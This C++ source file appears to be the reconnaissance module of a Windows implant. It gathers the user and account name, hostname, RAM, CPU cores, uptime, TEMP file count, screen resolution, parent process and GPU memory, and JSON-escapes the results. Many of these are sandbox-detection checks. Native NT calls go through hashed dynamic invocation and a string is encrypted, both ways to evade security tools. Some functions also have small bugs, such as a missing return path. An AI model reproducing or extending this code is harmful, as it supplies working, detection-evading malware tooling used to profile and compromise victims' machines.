#include "recon.h"
#include <d3d11.h>
#include <dxgi.h>
#include <string>
#include <codecvt>
#include <locale>

#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "dxgi.lib")

static auto& dynamicInvoker = DynamicInvoker::get_instance();


auto getCurrentTime() -> std::string {
    std::time_t now = std::time(nullptr);
    char* timeStr = std::ctime(&now);
    std::string result(timeStr);
    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }
    return result;
}

auto GetUsername() -> std::string {
    WCHAR username[256];
    DWORD size = 256;

    if (GetUserNameW(username, &size)) {
        return WideToUtf8(username);
    }
    return "";
}

auto GetHostname() -> std::string {
    WCHAR hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;

    if (GetComputerNameW(hostname, &size)) {
        return WideToUtf8(hostname);
    }
    return "";
}

auto GetAccountPrivilege() -> std::string {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        return "";
    }

    DWORD len = 0;
    GetTokenInformation(token, TokenUser, nullptr, 0, &len);
    PTOKEN_USER tokenUser = (PTOKEN_USER)malloc(len);
    if (!GetTokenInformation(token, TokenUser, tokenUser, len, &len)) {
        CloseHandle(token);
        free(tokenUser);
        return "";
    }

    WCHAR name[256], domain[256];
    DWORD nameLen = 256, domainLen = 256;
    SID_NAME_USE sidType;

    std::string result;
    if (LookupAccountSidW(NULL, tokenUser->User.Sid, name, &nameLen, domain, &domainLen, &sidType)) {
        std::wstring raw = std::wstring(domain) + L"\\" + std::wstring(name);
        result = EscapeJsonString(WideToUtf8(raw));  
    }
    else {
        result = "";
    }

    CloseHandle(token);
    free(tokenUser);
    return result;
}

auto GetPhysicalMemory() -> ULONG64 {
    SYSTEM_MEMORY_USAGE_INFORMATION smui = { 0 };
    ULONG size = 0;
    NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(ZwQuerySystemInformationStruct.funcAddr, ZwQuerySystemInformationStruct.funcHash,
        SystemMemoryUsageInformation, &smui, sizeof(SYSTEM_MEMORY_USAGE_INFORMATION), &size);
    return smui.TotalPhysicalBytes / (1024 * 1024 * 1024);
}

 // CPU
auto GetCpuCoreNum() -> ULONG64 {
    SYSTEM_BASIC_INFORMATION sbi = { 0 };
    ULONG size = 0;
    NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(ZwQuerySystemInformationStruct.funcAddr, ZwQuerySystemInformationStruct.funcHash,
        SystemBasicInformation, &sbi, sizeof(SYSTEM_BASIC_INFORMATION), &size);

    return sbi.NumberOfProcessors;
}
auto GetBootTime() -> ULONG64 {
    return AR_getTickcount64() / 1000;
}
auto GetBootTimeMinute() -> ULONG64 {
    return GetBootTime() / 60;
}
auto GetTempFileNum() -> ULONG64 {
    return 0;
}

auto GetResolution() -> std::string {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    return std::to_string(screenWidth) + "x" + std::to_string(screenHeight);
}

// TODO: convert to NT impl
auto GetCurrentExeDir() -> std::string {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    std::string fullPath(path);
    size_t pos = fullPath.find_last_of("\\/");
    std::string dir = (pos != std::string::npos) ? fullPath.substr(0, pos) : fullPath;

    return EscapeJsonString(dir);  
}

auto GetParentProcessId() -> DWORD {
    PROCESS_BASIC_INFORMATION pbi;
    NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtQueryInformationProcessStruct.funcAddr, NtQueryInformationProcessStruct.funcHash,
		GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
    if (NT_SUCCESS(status)) {  
        return (DWORD)(pbi.InheritedFromUniqueProcessId);
    }
    else {
        return 0;
    }
}

auto GetParentProcessName() -> std::string {
    DWORD pid = GetParentProcessId();
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr = { 0 };
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    CLIENT_ID cid = { 0 };
    cid.UniqueProcess = (HANDLE)pid;
    
    NTSTATUS status  = dynamicInvoker.Invoke<NTSTATUS>(NtOpenProcessStruct.funcAddr, NtOpenProcessStruct.funcHash,
        &hProcess,PROCESS_QUERY_INFORMATION,&objAttr,&cid);

    if (NT_SUCCESS(status)) {
        BYTE buffer[0x200] = { 0 };
        ULONG retLen = 0;

        NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtQueryInformationProcessStruct.funcAddr, NtQueryInformationProcessStruct.funcHash,
            hProcess, ProcessImageFileName, buffer, sizeof(buffer), &retLen);
        
        if(!NT_SUCCESS(status)) return "";
        
        PUNICODE_STRING pImage = (PUNICODE_STRING)buffer;
        std::wstring imagePath(pImage->Buffer, pImage->Length / sizeof(WCHAR));

        CloseHandle(hProcess);
        return EscapeJsonString(WideToUtf8(imagePath));
    }
}

auto GetCurrentExecutablePath() -> std::wstring {
    wchar_t buffer[MAX_PATH];
    DWORD length = GetModuleFileNameW(NULL, buffer, MAX_PATH);
    if (length == 0 || length == MAX_PATH)
    {
        return L"";
    }
    return std::wstring(buffer, length);
}


auto getTempFileCount() -> int
{
    int fileCount = 0;
    DWORD dwRet;
    LPSTR pszOldVal = (LPSTR)malloc(MAX_PATH * sizeof(char));

    dwRet = GetEnvironmentVariableA(ENCRYPT_STR("TEMP"), pszOldVal, MAX_PATH);
    if (dwRet == 0 || dwRet > MAX_PATH) {
        free(pszOldVal);
        return FALSE;
    }

    std::string tempDir = pszOldVal;
    tempDir += "\\*";
    free(pszOldVal);  
    WIN32_FIND_DATAA data;
    HANDLE hFind = FindFirstFileA(tempDir.c_str(), &data);
    if (hFind == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    do {
        if (strcmp(data.cFileName, ".") == 0 || strcmp(data.cFileName, "..") == 0) {
            continue;
        }

        if (!(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            fileCount++;
        }

    } while (FindNextFileA(hFind, &data) != 0);

    FindClose(hFind);  


    return fileCount;
}

auto getTempFileCountStr() -> std::string
{
    return std::to_string(getTempFileCount());
}

int getMaxGPUMemory(std::string* GPUName = nullptr){

    D3D_FEATURE_LEVEL featureLevel;
    ID3D11Device* device = nullptr;
    ID3D11DeviceContext* context = nullptr;

    HRESULT hr = D3D11CreateDevice(
        nullptr,
        D3D_DRIVER_TYPE_HARDWARE,
        nullptr,
        0,
        nullptr, 0,
        D3D11_SDK_VERSION,
        &device,
        &featureLevel,
        &context
    );

    if (FAILED(hr)) {
        return FALSE;
    }

    IDXGIFactory* dxgiFactory = nullptr;
    hr = CreateDXGIFactory(__uuidof(IDXGIFactory), (void**)&dxgiFactory);
    if (FAILED(hr)) {
        device->Release();
        return FALSE;
    }

    IDXGIAdapter* adapter = nullptr;
    UINT adapterIndex = 0;
    ULONG maxGPUMemory = 0; // MB
    std::wstring maxGPUName;

    while (dxgiFactory->EnumAdapters(adapterIndex, &adapter) != DXGI_ERROR_NOT_FOUND) {
        DXGI_ADAPTER_DESC adapterDesc;
        hr = adapter->GetDesc(&adapterDesc);
        if (SUCCEEDED(hr)) {
            ULONG memoryMB = adapterDesc.DedicatedVideoMemory / (1024 * 1024); // MB
            if (memoryMB > maxGPUMemory) {
                maxGPUMemory = memoryMB;
                maxGPUName = adapterDesc.Description;
            }
        }
        adapter->Release();
        adapterIndex++;
    }


    dxgiFactory->Release();
    device->Release();

    if (GPUName && !maxGPUName.empty()) {
        std::wstring_convert<std::codecvt_utf8<wchar_t>> conv;
        *GPUName = conv.to_bytes(maxGPUName);
    }



    return maxGPUMemory;
}

std::string getMaxGPUMemoryStr(){
    return std::to_string(getMaxGPUMemory());
}
